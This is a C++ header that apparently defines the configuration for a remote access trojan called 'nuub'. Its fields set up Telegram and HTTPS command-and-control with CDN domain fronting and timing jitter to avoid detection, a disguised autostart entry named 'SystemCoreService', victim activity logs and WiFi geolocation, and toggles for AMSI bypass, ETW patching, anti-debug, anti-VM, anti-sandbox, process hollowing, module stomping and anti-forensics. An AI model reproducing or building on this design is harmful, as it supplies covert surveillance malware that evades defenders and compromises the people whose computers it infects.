#pragma once

#include <cstdint>
#include <string>
#include <vector>

namespace nuub::domain::entities {

struct AdminRoleConfig {
    std::int64_t chat_id;
    std::string name;
    std::string permission;  // "readonly", "limited", "full"
};

struct Config {
    std::string telegram_bot_token;
    std::int64_t admin_chat_id = 0;
    std::vector<std::int64_t> admin_chat_ids;
    std::vector<AdminRoleConfig> admin_roles;  // New: per-admin permissions
    std::string pc_identifier = "PC-Principal";
    std::string encryption_password;
    std::string master_log_filename = "log_master.txt";
    std::string activity_log_filename = "activity_log.csv";
    std::string audit_log_filename = "audit.log";
    std::string auto_start_entry_name = "SystemCoreService";
    std::string log_filename = "nuub.log";
    int heartbeat_interval_minutes = 30;
    // C2 settings (HTTPS encrypted channel)
    std::string c2_server_url;              // e.g., "https://my-c2.com"
    std::string c2_encryption_key;          // Shared secret for AES-256-GCM
    bool c2_enabled = false;                // Enable HTTPS C2 alongside Telegram
    bool c2_domain_fronting = false;        // Use CDN domain fronting
    std::string c2_front_domain;            // CDN domain (e.g., "ajax.cloudflare.com")
    int c2_poll_interval_ms = 5000;         // Poll interval in ms
    int c2_jitter_ms = 2000;                // Jitter to avoid pattern detection

    // Evasion settings
    bool stealth_mode = false;
    bool anti_debug = true;
    bool anti_vm = true;
    bool etw_patch = true;
    bool amsi_bypass = true;
    bool process_hollowing = false;
    bool module_stomping = false;
    bool direct_syscall = false;
    bool anti_sandbox = true;
    bool environment_keying = true;
    bool anti_forensic = false;

    // Geolocation
    std::string google_maps_api_key;        // For WiFi-based geolocation via Google API
};

} // namespace nuub::domain::entities
